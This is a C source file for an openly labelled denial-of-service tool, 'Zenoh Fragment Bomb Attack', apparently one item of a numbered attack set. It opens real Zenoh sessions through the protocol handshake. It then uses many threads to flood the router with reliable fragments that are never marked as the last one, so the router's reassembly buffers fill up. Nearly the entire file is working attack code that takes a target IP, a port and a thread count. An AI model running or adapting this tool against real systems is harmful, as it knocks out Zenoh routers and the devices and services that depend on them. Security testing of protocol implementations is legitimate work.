/*
 * Attack 3: Fragment Bomb
 * Sends incomplete fragments to exhaust reassembly buffers
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sys/time.h>

#define Z_MSG_FRAGMENT 0x06
#define Z_FLAG_MORE 0x40
#define Z_FLAG_RELIABLE 0x20
#define Z_MSG_INIT 0x01
#define Z_MSG_OPEN 0x02
#define Z_FLAG_A 0x20       /* INIT/OPEN: ack */
#define Z_FLAG_S 0x40       /* INIT: size params present */
#define Z_FLAG_T 0x40       /* OPEN: lease in seconds */
#define Z_PROTO_VERSION 0x09
#define Z_WHATAMI_CLIENT 0x02
#define Z_ZID_LEN 16
#define Z_RES_FSN_DEFAULT 0x02  /* frame SN resolution without the S flag: 32 bits */

/* Highest fragment SN the router accepts for each negotiated resolution (8, 16, 32, 64 bits). */
static const unsigned long long SN_MASK[4] = {0x7F, 0x3FFF, 0x0FFFFFFF, 0xFFFFFFFF};

static volatile int g_running = 1;
static atomic_ullong g_fragments_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping fragment bomb...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

static int decode_zint(const unsigned char *buf, size_t len, size_t *off, unsigned long long *value) {
    *value = 0;
    for (int shift = 0; *off < len && shift < 64; shift += 7) {
        unsigned char b = buf[(*off)++];
        *value |= (unsigned long long)(b & 0x7F) << shift;
        if (!(b & 0x80)) return 0;
    }
    return -1;
}

/* Finishes partial sends: a batch cut in half would misalign the stream for the router. */
static int send_all(int sock, const unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = send(sock, buf, len, MSG_NOSIGNAL);
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) && g_running) continue;
        if (n <= 0) return -1;
        buf += n;
        len -= (size_t)n;
    }
    return 0;
}

static int recv_all(int sock, unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = recv(sock, buf, len, 0);
        if (n <= 0) return -1;
        buf += n;
        len -= n;
    }
    return 0;
}

/* On TCP every batch is preceded by its length (2 bytes, little-endian). */
static int send_batch(int sock, const unsigned char *msg, size_t len) {
    unsigned char out[2 + 4096];
    if (len > sizeof(out) - 2) return -1;
    out[0] = len & 0xFF;
    out[1] = (len >> 8) & 0xFF;
    memcpy(out + 2, msg, len);
    return send_all(sock, out, len + 2);
}

static int recv_batch(int sock, unsigned char *buf, size_t cap) {
    unsigned char hdr[2];
    if (recv_all(sock, hdr, 2) < 0) return -1;
    size_t len = hdr[0] | (hdr[1] << 8);
    if (len == 0 || len > cap || recv_all(sock, buf, len) < 0) return -1;
    return (int)len;
}

/* InitSyn -> InitAck, OpenSyn(cookie, initial sn) -> OpenAck: the router drops a link whose first message is not InitSyn. */
static int open_session(int sock, unsigned int *seed, unsigned long long seq, unsigned long long *sn_mask) {
    unsigned char msg[2048], cookie[2048];
    size_t off = 0;
    unsigned long long cookie_len;
    unsigned char res = Z_RES_FSN_DEFAULT;
    int len;

    msg[off++] = Z_MSG_INIT;
    msg[off++] = Z_PROTO_VERSION;
    msg[off++] = ((Z_ZID_LEN - 1) << 4) | Z_WHATAMI_CLIENT;
    for (int i = 0; i < Z_ZID_LEN; i++) msg[off++] = rand_r(seed) & 0xFF;
    msg[3] |= 0x01;  /* zid must not be zero */
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 3 || (msg[0] & 0x1F) != Z_MSG_INIT || !(msg[0] & Z_FLAG_A)) return -1;
    off = 2;
    off += 1 + (msg[2] >> 4) + 1;
    if (msg[0] & Z_FLAG_S) {
        if (off + 3 > (size_t)len) return -1;
        res = msg[off] & 0x03;  /* negotiated frame SN resolution */
        off += 3;
    }
    *sn_mask = SN_MASK[res];
    if (decode_zint(msg, len, &off, &cookie_len) < 0 || off + cookie_len > (size_t)len) return -1;
    memcpy(cookie, msg + off, cookie_len);

    off = 0;
    msg[off++] = Z_MSG_OPEN | Z_FLAG_T;
    off += encode_zint(msg + off, 10);              /* lease, seconds */
    off += encode_zint(msg + off, seq & *sn_mask);  /* the router expects this SN on the first fragment */
    off += encode_zint(msg + off, cookie_len);
    if (off + cookie_len > sizeof(msg)) return -1;
    memcpy(msg + off, cookie, cookie_len);
    off += cookie_len;
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 1 || (msg[0] & 0x1F) != Z_MSG_OPEN || !(msg[0] & Z_FLAG_A)) return -1;
    return 0;
}

size_t craft_fragment(unsigned char *buffer, unsigned long long seq, int variant, unsigned long long sn_mask) {
    size_t offset = 0;

    /* FRAGMENT with More set: a fragment that is never the last one, so the router keeps buffering. */
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq & sn_mask);

    size_t frag_size;
    switch (variant % 3) {
        case 0: frag_size = 512; break;
        case 1: frag_size = 1024; break;
        case 2: frag_size = 2048; break;
        default: frag_size = 512; break;
    }

    for (size_t i = 0; i < frag_size && offset < 4096; i++) {
        buffer[offset++] = (seq + i) % 256;
    }

    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[4096];
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned int seed = (unsigned int)time(NULL) ^ ((unsigned int)args->thread_id << 16) ^ (unsigned int)getpid();
    unsigned long long sn_mask;
    int failed = 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    /* lets SIGINT stop a thread blocked on a full send buffer or on a silent router */
    struct timeval snd_to = {1, 0}, rcv_to = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &snd_to, sizeof(snd_to));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_to, sizeof(rcv_to));

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);

    errno = 0;
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0 ||
        open_session(sock, &seed, seq, &sn_mask) < 0) {
        fprintf(stderr, "[-] Thread %d: Zenoh session not opened: %s\n",
                args->thread_id, errno ? strerror(errno) : "unexpected reply");
        close(sock);
        free(args);
        return NULL;
    }

    printf("[+] Thread %d started (base seq=%llu)\n", args->thread_id, seq);

    unsigned long local_count = 0;
    int variant = 0;

    while (g_running && !failed) {
        for (int i = 0; i < 50; i++) {
            size_t msg_len = craft_fragment(buffer, seq++, variant++, sn_mask);

            if (send_batch(sock, buffer, msg_len) < 0) {
                failed = 1;
                break;
            }
            atomic_fetch_add(&g_fragments_sent, 1);
            local_count++;
        }

        if (local_count % 5000 == 0) {
            printf("[Thread %d] Sent %lu fragments (seq=%llu)\n",
                   args->thread_id, local_count, seq);
        }

        usleep(10000);
    }

    if (failed && g_running) {
        fprintf(stderr, "[-] Thread %d: send failed: %s\n", args->thread_id, strerror(errno));
    }
    close(sock);
    printf("[*] Thread %d stopped (sent %lu fragments)\n",
           args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Fragment Bomb Attack               ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Fragment variants: 3 sizes (512/1024/2048 bytes)\n");
    printf("[*] Attack: Incomplete fragments (never complete)\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Fragment bomb started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_fragments_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] Fragments: %llu | Rate: %.2f fps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total = atomic_load(&g_fragments_sent);
    time_t duration = time(NULL) - start;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Fragments: %-25llu ║\n", total);
    printf("║ Duration:        %-25ld ║\n", duration);
    if (duration > 0) {
        printf("║ Avg Rate:        %-21.2f fps ║\n", (double)total / duration);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}